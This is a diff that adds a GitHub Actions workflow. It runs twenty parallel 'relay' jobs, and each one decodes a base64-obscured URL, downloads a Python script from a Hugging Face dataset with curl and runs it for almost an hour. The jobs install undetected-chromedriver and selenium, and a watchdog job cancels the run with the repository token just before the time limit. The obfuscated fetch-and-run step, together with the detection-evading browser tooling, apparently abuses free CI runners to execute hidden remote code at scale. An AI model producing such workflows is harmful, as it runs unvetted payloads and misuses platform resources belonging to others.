@@ -1,0 +1,104 @@
+name: Obsidian Helix Relay Grid
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: obsidian-helix-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Relay Units: parallel worker nodes
+  # =================================================================
+  helix-relay:
+    name: "RelayUnit-${{ matrix.node_tag }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_tag: [N1A, N2B, N3C, N4D, N5E, N6F, N7G, N8H, N9J, N10K, N11L, N12M, N13N, N14P, N15Q, N16R, N17S, N18T, N19U, N20V]
+
+    steps:
+      # #################################################################
+      # Phase 1: Bootstrap the unit
+      # #################################################################
+      - name: Bootstrap Unit Environment
+        run: |
+          echo "[BOOTSTRAP] Preparing RelayUnit-${{ matrix.node_tag }} on the runner..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Phase 2: Fetch the relay agent payload
+      # #################################################################
+      - name: Fetch Relay Agent
+        run: |
+          echo "[FETCH] Retrieving relay agent payload from source..."
+          AGENT_SOURCE=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$AGENT_SOURCE" -o relay_agent.py
+          echo "[FETCH] Relay agent payload stored locally."
+
+      # #################################################################
+      # Phase 3: Resolve runtime dependencies
+      # #################################################################
+      - name: Resolve Dependencies
+        run: |
+          echo "[DEPS] Resolving runtime dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Phase 4: Activate the relay agent (3540s ceiling)
+      # #################################################################
+      - name: Activate Relay Agent
+        run: |
+          echo ">> Starting RelayUnit-${{ matrix.node_tag }} agent..."
+
+          python3 relay_agent.py &
+          RELAY_PID=$!
+
+          echo ">> Agent online. Hard ceiling: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$RELAY_PID" 2>/dev/null; then
+            echo ">> Ceiling reached — stopping agent."
+            kill -9 "$RELAY_PID"
+            echo ">> Agent stopped by the ceiling controller."
+          else
+            echo ">> Agent finished ahead of the ceiling."
+          fi
+
+  # =================================================================
+  # Watchdog: sleeps 59 minutes then cancels the whole run
+  # =================================================================
+  helix-watchdog:
+    name: "Helix Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      GUARD_WINDOW: 3540
+
+    steps:
+      - name: Arm Watchdog
+        run: |
+          echo "[WATCHDOG] Watchdog armed for run: ${{ github.run_id }}"
+          echo "[WATCHDOG] Holding for ${GUARD_WINDOW} seconds before the 59-minute mark."
+
+          sleep "${GUARD_WINDOW}"
+
+          echo "[WATCHDOG] Threshold crossed — issuing cancellation request."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHDOG] Cancellation request sent. Active and pending jobs will be halted."
